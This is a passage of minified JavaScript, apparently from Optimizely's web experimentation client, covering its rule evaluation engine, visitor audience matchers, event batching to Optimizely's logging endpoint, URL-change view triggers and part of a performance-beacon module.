            if (n.hasOwnProperty(t.clause.OFFSET)) {
              var u = n[t.clause.OFFSET];
              (!i.isNumber(u) || Number(u) < 0 || Number(u) !== Math.floor(Number(u))) && r.push("OFFSET must be a non-negative integer");
            }
            if (n.hasOwnProperty(t.clause.LIMIT)) {
              var c = n[t.clause.LIMIT];
              (!i.isNumber(c) || Number(c) < 0 || Number(c) !== Math.floor(Number(c))) && r.push("LIMIT must be a non-negative integer");
            }
            return e > 0 && (r = i.map(r, function (n) {
              return "Sub-rule " + e + ": " + n;
            })), n.hasOwnProperty(t.clause.FROM) && (r = r.concat(h(n[t.clause.FROM], e + 1))), r;
          },
          p = function (n, e) {
            var r,
              u,
              c,
              l = e;
            if (n.hasOwnProperty(t.clause.FROM) && (o.debug("Evaluating FROM clause:", n[t.clause.FROM]), l = p(n[t.clause.FROM], l), o.debug("Results after FROM:", l)), o.debug("Evaluating WHERE clause:", n[t.clause.WHERE]), l = i.filter(l, function (e) {
              return v(e, n[t.clause.WHERE]);
            }), o.debug("Results after WHERE:", l), n.hasOwnProperty(t.clause.AGGREGATE)) {
              o.debug("Evaluating AGGREGATE clause:", n[t.clause.AGGREGATE]);
              var d = function (n, t) {
                var e = {};
                if (void 0 === n || !i.isArray(n) || 0 === n.length) return e["*"] = {
                  fieldValues: {},
                  events: t
                }, e;
                for (var r = i.map(n, function (n) {
                    return n.field;
                  }), o = 0; o < t.length; o++) {
                  for (var a = t[o], u = [], c = {}, l = 0; l < r.length; l++) {
                    var d = r[l],
                      v = f(a, d),
                      h = d.join(".");
                    c[h] = v, u.push(encodeURIComponent(h) + "=" + encodeURIComponent(s.stringify(v)));
                  }
                  var p = u.join("&");
                  e.hasOwnProperty(p) || (e[p] = {
                    fieldValues: c,
                    events: []
                  }), e[p].events.push(a);
                }
                return e;
              }(n[t.clause.GROUP_BY], l);
              l = function (n, t) {
                var e = [];
                return i.each(n, function (n, r) {
                  var o = i.extend({}, n.fieldValues),
                    a = t[r] || {};
                  i.extend(o, a), e.push(o);
                }), e;
              }(d, (r = n[t.clause.AGGREGATE], u = d, c = {}, i.each(u, function (n, e) {
                c[e] = {};
                for (var i = 0; i < r.length; i++) {
                  var a = r[i],
                    u = a.op;
                  if (u in t.aggregateOperators) {
                    var s = (a.args && a.args[0] || {}).field || t.DEFAULT_FIELD,
                      f = t.generateAlias(u, s),
                      l = t.aggregateOperators[u]([s], n.events);
                    c[e][f] = l;
                  } else o.error("Rules", "Unknown aggregate operator " + u);
                }
              }), c)), o.debug("Results after AGGREGATE:", l);
            }
            n.hasOwnProperty(t.clause.HAVING) && (o.debug("Evaluating HAVING clause:", n[t.clause.HAVING]), l = i.filter(l, function (e) {
              return v(e, n[t.clause.HAVING]);
            }), o.debug("Results after HAVING:", l)), n.hasOwnProperty(t.clause.ORDER_BY) && (o.debug("Evaluating ORDER_BY clause:", n[t.clause.ORDER_BY]), l = function (n, t) {
              return i.isArray(n) ? 0 === n.length ? t : t.sort(function (t, e) {
                for (var i = 0; i < n.length; i++) {
                  var r = n[i],
                    o = "ASC" === (r.direction || "ASC") ? 1 : -1,
                    a = r.field,
                    u = f(t, a, 0),
                    c = f(e, a, 0);
                  if (u < c) return -o;
                  if (u > c) return o;
                }
                return 0;
              }) : (a("Rules", "groupBy rule must be an array"), t);
            }(n[t.clause.ORDER_BY], l), o.debug("Results after ORDER_BY:", l));
            var h,
              g = 0;
            return n.hasOwnProperty(t.clause.OFFSET) && (o.debug("Evaluating OFFSET clause:", n[t.clause.OFFSET]), g = Number(n[t.clause.OFFSET])), n.hasOwnProperty(t.clause.LIMIT) && (o.debug("Evaluating LIMIT clause:", n[t.clause.LIMIT]), h = g + Number(n[t.clause.LIMIT])), (g > 0 || !i.isUndefined(h)) && (l = l.slice(g, h), o.debug("Results after OFFSET/LIMIT:", l)), n.hasOwnProperty(t.clause.SELECT) && (o.debug("Evaluating SELECT clause:", n[t.clause.SELECT]), l = function (n, t) {
              return i.map(t, function (t) {
                return i.map(n, function (n) {
                  return v(t, n);
                });
              });
            }(n[t.clause.SELECT], l), o.debug("Results after SELECT:", l)), l;
          };
        t.execute = function (n, e) {
          n = t.rewrite(n), o.shouldLog(r.LogLevel.DEBUG) && o.groupCollapsed("Evaluating Behavioral Rule"), o.debug("Rule:", n, s.stringify(n)), o.debug("Events:", e);
          var i = h(n);
          if (i.length > 0) throw new Error("Rule " + s.stringify(n) + " has violations: " + i.join("\n"));
          var a = p(n, e);
          return o.debug("Rule result:", a), o.shouldLog(r.LogLevel.DEBUG) && o.groupEnd(), a;
        }, t.isSatisfied = function (n, e) {
          try {
            return t.execute(n, e).length > 0;
          } catch (i) {
            return o.error("Rules", "Error " + i.toString() + " while evaluating rule " + s.stringify(n)), !1;
          }
        };
      },
      5664: function (n, t, e) {
        n.exports = function (n) {
          n.registerDependency("sources/browser_id", e(6003)), n.registerVisitorProfileProvider(e(806)), n.registerVisitorProfileProvider(e(6442)), n.registerAudienceMatcher("browser_version", e(716));
        };
      },
      716: function (n, t, e) {
        var i = e(4364).y;
        n.exports = {
          fieldsNeeded: ["browserVersion", "browserId"],
          match: function (n, t) {
            var e = t.value,
              r = n.browserId,
              o = n.browserVersion;
            if (0 === e.indexOf(r)) {
              var a = e.substr(r.length);
              return 0 === i(o, a);
            }
            return !1;
          }
        };
      },
      806: function (n) {
        n.exports = {
          provides: "browserId",
          shouldTrack: !0,
          isSticky: !0,
          getter: ["sources/browser_id", function (n) {
            return n.getId();
          }]
        };
      },
      6442: function (n) {
        n.exports = {
          provides: "browserVersion",
          getter: ["sources/browser_id", function (n) {
            return n.getVersion();
          }]
        };
      },
      6003: function (n, t, e) {
        var i = e(769);
        t.getId = function () {
          return i.get().browser.id;
        }, t.getVersion = function () {
          return i.get().browser.version;
        };
      },
      6093: function (n, t, e) {
        n.exports = function (n) {
          n.registerVisitorProfileProvider(e(3045)), n.registerAudienceMatcher("campaign", e(817));
        };
      },
      817: function (n, t, e) {
        var i = e(6061);
        n.exports = {
          fieldsNeeded: ["campaign"],
          match: function (n, t) {
            return i.hasMatch(t.value, t.match, n.campaign);
          }
        };
      },
      3045: function (n, t, e) {
        var i = e(4005);
        n.exports = {
          provides: "campaign",
          shouldTrack: !0,
          isSticky: !0,
          getter: [function () {
            return i.getQueryParamValue("utm_campaign");
          }]
        };
      },
      7217: function (n, t, e) {
        n.exports = function (n) {
          n.registerAudienceMatcher("code", e(1764));
        };
      },
      1764: function (n, t, e) {
        var i = e(9576),
          r = e(9404);
        t.fieldsNeeded = [], t.match = function (n, t) {
          if (i.isUndefined(t.value)) return !0;
          if ("function" == typeof t.value) try {
            return Boolean(r.apply(t.value));
          } catch (e) {
            return !1;
          } else try {
            return Boolean(r.eval(t.value));
          } catch (o) {
            return !1;
          }
          return !1;
        };
      },
      9031: function (n, t, e) {
        n.exports = function (n) {
          n.registerVisitorProfileProvider(e(8516)), n.registerAudienceMatcher("cookies", e(994));
        };
      },
      994: function (n, t, e) {
        var i = e(6061);
        n.exports = {
          fieldsNeeded: ["cookies"],
          match: function (n, t) {
            var e = t.name,
              r = t.value,
              o = t.match,
              a = n.cookies[e];
            return i.hasMatch(r, o, a);
          }
        };
      },
      8516: function (n, t, e) {
        var i = e(9576),
          r = e(8718),
          o = e(4041).get("stores/audience_data");
        n.exports = {
          provides: "cookies",
          isLazy: !0,
          getter: [function () {
            var n = r.getAll(),
              t = o.getFeaturesNeeded("cookies");
            return i.reduce(n, function (n, e, r) {
              return i.has(t, r) && (n[r] = e), n;
            }, {});
          }]
        };
      },
      8068: function (n, t, e) {
        n.exports = function (n) {
          n.registerVisitorProfileProvider(e(9286));
          var t = e(2531);
          n.registerAudienceMatcher("custom_attribute", t), n.registerAudienceMatcher("custom_dimension", t);
        };
      },
      2531: function (n, t, e) {
        var i = e(9576),
          r = e(6061);
        t.match = function (n, t) {
          var e;
          return n.custom && (e = n.custom[t.name]), i.isObject(e) && (e = e.value), r.hasMatch(t.value, t.match, e);
        };
      },
      9286: function (n, t, e) {
        var i = e(9576),
          r = e(8964),
          o = e(2678),
          a = e(4041).get("stores/dimension_data");
        n.exports = {
          provides: "custom",
          attributionType: r.AttributionTypes.LAST_TOUCH,
          restorer: function (n) {
            return i.reduce(n, function (n, t, e) {
              var r = e,
                u = a.getByApiName(e),
                c = a.getById(e);
              return i.isObject(t) ? (!t.id && u && (c = u, r = u.id, i.extend(t, {
                id: c.segmentId || c.id
              })), !t.name && c && c.apiName && (t.name = c.apiName), t.id || c || o.warn("Unable to determine ID for custom attribute:", e, "; segmentation is disabled."), n[r] = t, n) : (o.error('Unable to restore custom attribute "' + e + '" because value is not an object'), n);
            }, {});
          },
          shouldTrack: !0
        };
      },
      520: function (n, t, e) {
        n.exports = function (n) {
          n.registerDependency("sources/device", e(8822)), n.registerVisitorProfileProvider(e(4917)), n.registerAudienceMatcher("device", e(1306));
        };
      },
      1306: function (n) {
        n.exports = {
          fieldsNeeded: ["device"],
          match: function (n, t) {
            return n.device === t.value;
          }
        };
      },
      4917: function (n) {
        n.exports = {
          provides: "device",
          shouldTrack: !0,
          isSticky: !0,
          getter: ["sources/device", function (n) {
            return n.getDevice();
          }]
        };
      },
      8822: function (n, t, e) {
        var i = e(769);
        t.getDevice = function () {
          var n = i.get().device;
          return "unknown" !== n.model ? n.model : "tablet" === n.type ? "tablet" : n.isMobile ? "mobile" : "desktop";
        };
      },
      9665: function (n, t, e) {
        n.exports = function (n) {
          n.registerVisitorProfileProvider(e(7510)), n.registerAudienceMatcher("device_type", e(4160));
        };
      },
      4160: function (n) {
        n.exports = {
          fieldsNeeded: ["device_type"],
          match: function (n, t) {
            return n.device_type === t.value;
          }
        };
      },
      7510: function (n, t, e) {
        var i = e(769);
        n.exports = {
          provides: "device_type",
          shouldTrack: !0,
          isSticky: !0,
          getter: [function () {
            var n = i.get().device;
            switch (n.type) {
              case "mobile":
                return "phone";
              case "tablet":
              case "desktop_laptop":
                return n.type;
              default:
                return "other";
            }
          }]
        };
      },
      4871: function (n, t, e) {
        n.exports = function (n) {
          n.registerVisitorProfileProvider(e(4349)), n.registerAudienceMatcher("query", e(9054));
        };
      },
      9054: function (n, t, e) {
        var i = e(9576),
          r = e(6061);
        t.fieldsNeeded = ["queryParams"], t.match = function (n, t) {
          var e = i.find(n.queryParams, function (n) {
            return n[0] === t.name;
          });
          return r.hasMatch(t.value, t.match, e ? e[1] : null);
        };
      },
      4349: function (n, t, e) {
        var i = e(4005);
        n.exports = {
          provides: "queryParams",
          getter: [function () {
            return i.getQueryParams();
          }]
        };
      },
      928: function (n, t, e) {
        n.exports = function (n) {
          n.registerVisitorProfileProvider(e(340)), n.registerAudienceMatcher("referrer", e(206));
        };
      },
      206: function (n, t, e) {
        var i = e(859);
        t.fieldsNeeded = ["referrer"], t.match = function (n, t) {
          return null !== n.referrer && i(n.referrer, t);
        };
      },
      340: function (n, t, e) {
        var i = e(6954),
          r = e(74);
        n.exports = {
          provides: "referrer",
          shouldTrack: !0,
          isSticky: !0,
          getter: [function () {
            var n = r.getReferrer() || i.getReferrer();
            return "" === n && (n = null), n;
          }]
        };
      },
      186: function (n, t, e) {
        n.exports = function (n) {
          n.registerVisitorProfileProvider(e(4859)), n.registerAudienceMatcher("source_type", e(1612));
        };
      },
      1612: function (n, t, e) {
        var i = e(6061);
        t.fieldsNeeded = ["source_type"], t.match = function (n, t) {
          return i.hasMatch(t.value, t.match, n.source_type);
        };
      },
      4859: function (n, t, e) {
        var i = e(4005),
          r = e(6954),
          o = e(74),
          a = e(6724),
          u = ["google\\.\\w{2,3}(\\.\\w{2,3})?/(search|url)", "bing\\.\\w{2,3}(\\.\\w{2,3})?/(search|url)", "yahoo\\.\\w{2,3}(\\.\\w{2,3})?/search", "baidu\\.\\w{2,3}(\\.\\w{2,3})?/", "https://(www)?\\.google\\..*?/?$", "https://search\\.yahoo\\..*?/?$", "https://(www)?\\.bing\\..*?/?$"];
        n.exports = {
          provides: "source_type",
          shouldTrack: !0,
          isSticky: !1,
          getter: [function () {
            return function (n, t) {
              var e,
                c = n(),
                s = function () {
                  if (i.getQueryParamValue("utm_source") || i.getQueryParamValue("gclid") || i.getQueryParamValue("otm_source")) return "campaign";
                  for (var n = o.getReferrer() || r.getReferrer(), t = 0; t < u.length; t++) {
                    var e = u[t];
                    if (n.match(e)) return "search";
                  }
                  return n && a.guessDomain(n) !== a.guessDomain(i.getUrl()) ? "referral" : "direct";
                }();
              e = s, (!c || "direct" !== e) && t(s);
            };
          }]
        };
      },
      1310: function (n, t, e) {
        n.exports = function (n) {
          n.registerVisitorProfileProvider(e(4397)), n.registerVisitorProfileProvider(e(1582)), n.registerAudienceMatcher("time_and_day", e(8809));
        };
      },
      8809: function (n, t, e) {
        var i = e(8290);
        t.fieldsNeeded = ["currentTimestamp"], t.match = function (n, t) {
          return i.test(t.value, new Date(n.currentTimestamp));
        };
      },
      4397: function (n, t, e) {
        var i = e(3792);
        n.exports = {
          provides: "currentTimestamp",
          shouldTrack: !0,
          isLazy: !0,
          getter: [function () {
            return i.now();
          }]
        };
      },
      1582: function (n) {
        n.exports = {
          provides: "offset",
          shouldTrack: !0,
          isLazy: !0,
          getter: [function () {
            return new Date().getTimezoneOffset();
          }]
        };
      },
      8290: function (n, t, e) {
        var i = e(9576);
        function r(n) {
          var t = n.split(":");
          if (2 !== t.length) throw new Error("optly.timeAndDayInterval.timeStringToMinutes: Invalid time string " + n);
          return 60 * parseInt(t[0], 10) + parseInt(t[1], 10);
        }
        t.test = function (n, t) {
          var e = function (n) {
              var t = n.split("_");
              if (3 !== t.length) throw new Error("Invalid time and day string " + n);
              var e = t[2].split(",");
              return {
                start_time: t[0],
                end_time: t[1],
                days: e
              };
            }(n),
            o = r(e.start_time),
            a = r(e.end_time),
            u = 60 * t.getHours() + t.getMinutes(),
            c = ["sunday", "monday", "tuesday", "wednesday", "thursday", "friday", "saturday"][t.getDay()];
          return u >= o && u <= a && i.includes(e.days, c);
        };
      },
      7644: function (n, t, e) {
        n.exports = function (n) {
          n.registerVisitorProfileProvider(e(9995));
        };
      },
      9995: function (n) {
        n.exports = {
          provides: "visitorId",
          getter: ["stores/visitor_id", function (n) {
            return n.getRandomId();
          }]
        };
      },
      3056: function (n, t, e) {
        var i = e(2676),
          r = e(2678),
          o = e(7984),
          a = e(74),
          u = e(9612),
          c = e(2188),
          s = "google_universal_analytics",
          f = e(5850);
        var l = function (n, t) {
            return o.pollFor(function () {
              return function (n) {
                var t = n.getGlobal("GoogleAnalyticsObject");
                return t ? n.getGlobal(t) : null;
              }(c);
            }, 200, 50).then(function (e) {
              var i = t.universal_analytics_tracker,
                r = i ? i + "." : "",
                o = t.universal_analytics_slot,
                u = a.getReferrer();
              u && e(r + "set", "referrer", u);
              var c = {
                nonInteraction: !0
              };
              c["dimension" + o] = n, e(r + "send", "event", "Optimizely", "Assigned To Campaign", c);
            });
          },
          d = {
            preRedirectPolicy: u.PreRedirectPolicies.PERSIST_BEFORE_REDIRECT,
            postRedirectPolicy: u.PostRedirectPolicies.TRACK_IMMEDIATELY,
            nonRedirectPolicy: u.NonRedirectPolicies.TRACK_IMMEDIATELY,
            trackLayerDecision: function (n) {
              var t = n.integrationSettings;
              if (t && t[s] && n.experimentId && n.variationId) {
                var e = {
                    id: n.layerId,
                    name: n.layerName,
                    policy: n.layerPolicy,
                    integrationStringVersion: n.integrationStringVersion
                  },
                  i = {
                    id: n.experimentId,
                    name: n.experimentName
                  },
                  o = {
                    id: n.variationId,
                    name: n.variationName
                  },
                  a = n.isLayerHoldback,
                  u = f.generateAnalyticsString(e, i, o, a, 150, !0);
                if (u) return l(u, t[s])["catch"](function (n) {
                  r.warn("Tracker for", s, "failed:", n);
                });
              }
            },
            serializeSettings: i.stringify,
            deserializeSettings: i.parse
          };
        n.exports = function (n) {
          n.registerAnalyticsTracker("google_universal_analytics", d);
        };
      },
      2774: function (n, t, e) {
        var i = e(9576),
          r = e(7989),
          o = e(1243),
          a = e(2805),
          u = e(6639).U,
          c = e(2676),
          s = e(2678),
          f = e(9612),
          l = e(1685),
          d = e(2188),
          v = e(3455),
          h = e(4041),
          p = (e(6954), e(4658)),
          g = e(7356),
          m = e(4797),
          _ = h.get("stores/global"),
          w = h.get("stores/tracker_optimizely"),
          y = t.Error = u("OptimizelyTrackerError"),
          b = "client_activation",
          E = "campaign_activated",
          I = "view_activated",
          A = {
            revenue: {
              validate: O,
              sanitize: Math.floor,
              excludeFeature: !0
            },
            quantity: {
              validate: O,
              sanitize: Math.floor,
              excludeFeature: !0
            },
            value: {
              validate: O,
              sanitize: i.identity
            }
          },
          T = "AUTO",
          S = [function () {
            return function (n) {
              P(function (n) {
                return i.extend({
                  entity_id: n.pageId,
                  key: n.pageApiName,
                  timestamp: n.timestamp,
                  uuid: n.eventId,
                  type: I
                }, D(n.eventTags));
              }(n), n.userFeatures, K(n.layerStates));
            };
          }],
          k = [function () {
            return function (n) {
              !function (n) {
                var t = i.isNull(_.getAnonymizeIP()) ? void 0 : _.getAnonymizeIP(),
                  e = {
                    account_id: n.accountId,
                    anonymize_ip: t,
                    client_name: n.clientName,
                    client_version: n.clientVersion,
                    project_id: n.projectId,
                    visitors: []
                  };
                e.revision = n.revision, e.enrich_decisions = !0;
                var r = {
                    session_id: L(n.sessionId),
                    visitor_id: n.visitorId,
                    attributes: [],
                    snapshots: []
                  },
                  o = K(n.layerStates);
                m.dispatch(a.REGISTER_TRACKER_VISITOR, {
                  data: e,
                  visitor: r,
                  decisions: o
                }), Y();
              }(n), P(function (n) {
                return {
                  entity_id: null,
                  type: b,
                  uuid: n.eventId,
                  timestamp: n.timestamp
                };
              }(n), n.userFeatures, K(n.layerStates));
            };
          }],
          R = [function () {
            return function (n) {
              var t;
              P((t = n, i.extend({
                entity_id: t.eventEntityId,
                key: t.eventApiName,
                timestamp: t.timestamp,
                uuid: t.eventId,
                type: t.eventCategory
              }, D(t.eventTags))), n.userFeatures, K(n.layerStates));
            };
          }],
          N = [function () {
            return function (n) {
              var t;
              P((t = n, i.extend({
                entity_id: t.eventEntityId,
                key: t.eventApiName,
                timestamp: t.timestamp,
                uuid: t.eventId,
                type: t.eventCategory
              }, D(t.eventTags))), n.userFeatures, K(n.layerStates));
            };
          }];
        function D(n) {
          var t = function (n, t, e) {
              try {
                C(t), n[e] = t;
              } catch (i) {
                r.emitError(new y("Bad value for eventTags[" + e + "]: " + i.message));
              }
              return n;
            },
            e = i.keys(A),
            o = i.omit(n, e),
            a = i.pick(n, e),
            u = i.reduce(o, t, {}),
            c = i.reduce(a, function (n, e, i) {
              var o = A[i];
              o.excludeFeature || t(u, e, i);
              try {
                o.validate(e), n[i] = o.sanitize(e), u[i] = n[i];
              } catch (a) {
                r.emitError(new y("Bad value for eventMetrics[" + i + "]: " + a.message));
              }
              return n;
            }, {});
          return c.tags = u, c;
        }
        function C(n) {
          if (null == n) throw new Error("Feature value is null");
          if ("object" == typeof n) {
            var t;
            try {
              t = c.stringify(n);
            } catch (e) {}
            throw new Error('Feature value is complex: "' + t);
          }
        }
        function O(n) {
          if (null == n) throw new Error("Metric value is null");
          if (!i.isNumber(n)) throw new Error("Metric value is not numeric");
        }
        function x(n) {
          return i.reduce(n, function (n, t) {
            try {
              C(t.value), n.push({
                entity_id: t.id || null,
                key: t.name,
                type: t.type,
                value: t.value
              });
            } catch (e) {
              s.warn("Error evaluating user feature", t, e);
            }
            return n;
          }, []);
        }
        function P(n, t, e) {
          m.dispatch(a.REGISTER_TRACKER_EVENT, {
            event: n,
            decisions: e
          }), M(t), Y();
        }
        function M(n) {
          var t = x(n);
          m.dispatch(a.UPDATE_TRACKER_VISITOR_ATTRIBUTES, {
            attributes: t
          });
        }
        function L(n) {
          return T;
        }
        function V() {
          if (w.canSend()) {
            var n = w.hasEventsToSend(),
              t = w.hasPreviousBatchesToSend();
            n || t ? (t && (i.each(w.getPreviousBatches(), F), m.dispatch(a.RESET_TRACKER_PREVIOUS_BATCHES)), n && (m.dispatch(a.FINALIZE_BATCH_SNAPSHOT), F(w.getEventBatch()), m.dispatch(a.RESET_TRACKER_EVENTS))) : s.debug("Not sending events because there are no events to send");
          } else s.debug("Not sending events (holding)");
        }
        function F(n) {
          s.debug("Sending ticket:", n);
          var t = o.generate();
          v.retryableRequest({
            url: "https://logx.optimizely.com/v1/events",
            method: "POST",
            data: U(n)
          }, t);
        }
        function U(n) {
          return i.extend({}, i.pick(n, ["account_id", "anonymize_ip", "client_name", "client_version", "enrich_decisions", "project_id", "revision"]), {
            visitors: i.map(n.visitors, z)
          });
        }
        function z(n) {
          return {
            visitor_id: n.visitor_id,
            session_id: T,
            attributes: i.map(n.attributes, j),
            snapshots: i.map(n.snapshots, G)
          };
        }
        function j(n) {
          return H(n, {
            entity_id: "e",
            key: "k",
            type: "t",
            value: "v"
          });
        }
        function G(n) {
          var t = n.events;
          return t = function (n) {
            var t = i.reduce(n, function (n, t) {
              var e;
              if (n[e = t.type === I && i.isEmpty(t.tags) && i.isEmpty(i.pick(t, i.keys(A))) ? t.type : t.uuid]) {
                var r = n[e].timestamp;
                t.timestamp > r && (r = t.timestamp), n[e] = i.extend({}, n[e], {
                  key: n[e].key + "-" + (t.key || ""),
                  entity_id: n[e].entity_id + "-" + t.entity_id,
                  timestamp: r
                });
              } else n[e] = t;
              return n;
            }, {});
            return i.values(t);
          }(t), {
            activationTimestamp: _.getActivationTimestamp(),
            decisions: i.map(n.decisions, B),
            events: i.map(t, q)
          };
        }
        function B(n) {
          return H(n, {
            campaign_id: "c",
            experiment_id: "x",
            is_campaign_holdback: "h",
            variation_id: "v"
          });
        }
        function q(n) {
          return n.key === E && (n.type = E, delete n.key), H(n, {
            entity_id: "e",
            key: "k",
            quantity: "q",
            revenue: "$",
            tags: "a",
            timestamp: "t",
            uuid: "u",
            value: "v",
            type: "y"
          });
        }
        function H(n, t) {
          return i.reduce(n, function (n, e, i) {
            return i in t && (n[t[i] || i] = e), n;
          }, {});
        }
        function Y() {
          if (w.shouldBatch()) {
            if (!w.isPolling()) {
              d.setTimeout(function n() {
                V(), w.isPolling() && d.setTimeout(n, 1e3);
              }, 1e3), m.dispatch(a.SET_TRACKER_POLLING, !0), d.setTimeout(function () {
                m.dispatch(a.SET_TRACKER_BATCHING, !1), m.dispatch(a.SET_TRACKER_POLLING, !1);
              }, 1e4);
            }
          } else V();
        }
        function K(n) {
          return i.map(n, function (n) {
            return {
              campaign_id: n.layerId,
              experiment_id: n.decision.experimentId,
              variation_id: n.decision.variationId,
              is_campaign_holdback: n.decision.isLayerHoldback
            };
          });
        }
        function $() {
          var n = w.getPersistableState();
          if (n) try {
            s.debug("Persisting pending batch:", n), l.persistTrackerOptimizelyData(n), m.dispatch(a.SET_TRACKER_DIRTY, !1);
          } catch (t) {
            s.debug("Failed to persist pending batch:", t);
          }
        }
        var W = {
          trackLayerDecision: function (n) {
            n.timing === f.TrackLayerDecisionTimingFlags.postRedirectPolicy ? function (n) {
              var t = x(n.userFeatures),
                e = {
                  account_id: n.accountId,
                  anonymize_ip: n.anonymizeIP,
                  client_name: n.clientName,
                  client_version: n.clientVersion,
                  project_id: n.projectId,
                  visitors: [{
                    session_id: L(n.sessionId),
                    visitor_id: n.visitorId,
                    attributes: t,
                    snapshots: [{
                      decisions: [{
                        campaign_id: n.layerId,
                        experiment_id: n.experimentId,
                        variation_id: n.variationId,
                        is_campaign_holdback: n.isLayerHoldback
                      }],
                      events: [{
                        uuid: n.decisionId,
                        entity_id: n.layerId,
                        timestamp: n.timestamp,
                        type: E
                      }]
                    }]
                  }]
                };
              m.dispatch(a.REGISTER_PREVIOUS_BATCH, e), Y();
            }(n) : function (n) {
              var t = {
                entity_id: n.layerId,
                type: E,
                uuid: n.decisionId,
                timestamp: n.timestamp
              };
              m.dispatch(a.REGISTER_TRACKER_DECISION, {
                decisionEvent: t,
                decisions: K(n.layerStates)
              }), M(n.userFeatures), Y();
            }(n);
          },
          postRedirectPolicy: f.PostRedirectPolicies.TRACK_AFTER_SYNC,
          nonRedirectPolicy: f.NonRedirectPolicies.TRACK_IMMEDIATELY,
          onPageActivated: S,
          onClientActivation: k,
          onClickEvent: N,
          onCustomEvent: R
        };
        n.exports = function (n) {
          n.registerAnalyticsTracker("optimizely", W), p.on({
            filter: {
              type: g.TYPES.ANALYTICS,
              name: "sendEvents"
            },
            handler: function () {
              m.dispatch(a.SET_TRACKER_SEND_EVENTS, !0), w.isPolling() || V();
            }
          }), p.on({
            filter: {
              type: g.TYPES.ANALYTICS,
              name: "holdEvents"
            },
            handler: function () {
              m.dispatch(a.SET_TRACKER_SEND_EVENTS, !1);
            }
          }), m.dispatch(a.SET_TRACKER_SEND_EVENTS, !0);
          var t = p.on({
            filter: {
              type: "lifecycle",
              name: "activated"
            },
            handler: function () {
              w.observe($), p.off(t);
            }
          });
        };
      },
      414: function (n, t, e) {
        n.exports = function (n) {
          n.registerViewProvider(e(2218)), n.registerViewMatcher("url", e(1154));
        };
      },
      1154: function (n, t, e) {
        var i = e(859);
        n.exports = {
          fieldsNeeded: ["url"],
          match: function (n, t) {
            return i(n.url, t);
          }
        };
      },
      2218: function (n, t, e) {
        var i = e(4005);
        n.exports = {
          provides: "url",
          getter: [function () {
            return i.getUrl();
          }]
        };
      },
      6357: function (n, t, e) {
        var i = e(6954),
          r = e(8964),
          o = e(4658),
          a = e(9328),
          u = e(9840),
          c = {
            token: void 0,
            setUpObserver: function () {
              a.createDOMChangedObserver(), this.token = o.on({
                filter: {
                  type: "viewTrigger",
                  name: "DOMChanged"
                },
                handler: function () {
                  u.getViewsAndActivate(r.ViewActivationTypes.DOMChanged);
                }
              });
            },
            turnOffObserver: function () {
              o.off(this.token);
            }
          };
        n.exports = function (n) {
          i.isReady() ? c.setUpObserver() : i.addReadyHandler(c.setUpObserver), n.registerViewTrigger("DOMChanged", c);
        };
      },
      3269: function (n, t, e) {
        var i = e(9576),
          r = e(2805),
          o = e(4041),
          a = e(8964),
          u = e(4658),
          c = e(4797),
          s = o.get("stores/history"),
          f = e(2678),
          l = e(8398).Promise,
          d = e(9840),
          v = e(2188);
        function h(n) {
          u.emit({
            type: "viewTrigger",
            name: "URLChanged",
            data: {
              source: n,
              newURL: v.getHref()
            }
          }, !0);
        }
        n.exports = function (n) {
          var t;
          t = function () {
            var n = s.getOriginalPushState().apply(this, arguments);
            return l.resolve().then(function () {
              h("pushState");
            })["catch"](function (n) {
              f.error("Error while wrapPushState: ", n);
            }), n;
          }, c.dispatch(r.ENSURE_ORIGINAL_PUSHSTATE), v.getGlobal("history").pushState = t, function () {
            var n = function () {
              var n = s.getOriginalReplaceState().apply(this, arguments);
              return l.resolve().then(function () {
                h("replaceState");
              })["catch"](function (n) {
                f.error("Error while wrapReplaceState: ", n);
              }), n;
            };
            c.dispatch(r.ENSURE_ORIGINAL_REPLACESTATE), v.getGlobal("history").replaceState = n;
          }(), v.addEventListener("popstate", p, !1), v.addEventListener("hashchange", g, !1), u.on({
            filter: {
              type: "viewTrigger",
              name: "URLChanged"
            },
            handler: function () {
              d.getViewsAndActivate(a.ViewActivationTypes.URLChanged);
            }
          }), n.registerViewTrigger("URLChanged");
        };
        var p = i.partial(h, "popstate"),
          g = i.partial(h, "hashchange");
      },
      106: function (n, t, e) {
        var i = e(9576),
          r = e(4041),
          o = e(4658),
          a = e(7356),
          u = e(2188),
          c = r.get("stores/directive"),
          s = "optimizelyPreview",
          f = function (n) {
            u.getGlobal(s).push(n);
          };
        t.initialize = function (n) {
          c.isSlave() && function (n) {
            var t = !1;
            if (i.isArray(window.optimizely) && i.each(window.optimizely, function (e) {
              i.isArray(e) && "verifyPreviewProject" === e[0] && String(e[1]) === n && (t = !0);
            }), !t) throw new Error("Preview projectId: " + n + " does not match expected");
          }(n), o.on({
            filter: {
              type: a.TYPES.ANALYTICS,
              name: "trackEvent"
            },
            handler: f
          }), o.on({
            filter: {
              type: a.TYPES.LIFECYCLE,
              name: "viewActivated"
            },
            handler: f
          }), o.on({
            filter: {
              type: a.TYPES.LIFECYCLE,
              name: "layerDecided"
            },
            handler: f
          }), o.on({
            filter: {
              type: "error"
            },
            publicOnly: !0,
            handler: f
          });
        }, t.setupPreviewGlobal = function () {
          u.getGlobal(s) || u.setGlobal(s, []);
        }, t.pushToPreviewGlobal = function (n) {
          f(n);
        };
      },
      8562: function (n, t, e) {
        var i = e(9576),
          r = e(1243),
          o = e(3113),
          a = e(5434),
          u = e(3792),
          c = e(6954),
          s = e(4797),
          f = e(4243).mM,
          l = e(2678),
          d = e(7170),
          v = e(8398).Promise,
          h = e(1685),
          p = e(2188),
          g = e(3455),
          m = e(2805),
          _ = e(8964),
          w = e(4041),
          y = w.get("stores/async_request"),
          b = w.get("stores/client_metadata"),
          E = w.get("stores/global"),
          I = w.get("stores/rum"),
          A = w.get("stores/performance"),
          T = w.get("stores/xdomain"),
          S = w.get("stores/view_data"),
          k = e(7431),
          R = "https://rum.optimizely.com/rum",
          N = "1.0";
        function D(n) {
          return i.isEmpty(n) ? v.resolve() : (t = function () {
            return g.request({
              url: R,
              method: "POST",
              data: n,
              withCredentials: !0
            }).then(function (n) {
              return o.resolveRequest("RUM_FIRST_BEACON", n), n;
            })["catch"](function (n) {
              throw l.error("POST to client-rum failed:", n), o.rejectRequest("RUM_FIRST_BEACON", n), n;
            });
          }, (e = y.getPromise("RUM_FIRST_BEACON")) ? e.then(t) : o.makeAsyncRequest("RUM_FIRST_BEACON", t));
          var t, e;
        }
        function C() {
          try {
            return !c.querySelector("body");
          } catch (n) {
            return null;
          }
        }
        function O() {
          var n = p.getGlobal("performance"),
            t = n ? n.timing : {},
            e = A.getMarks() || {},
            r = I.getApiData(),
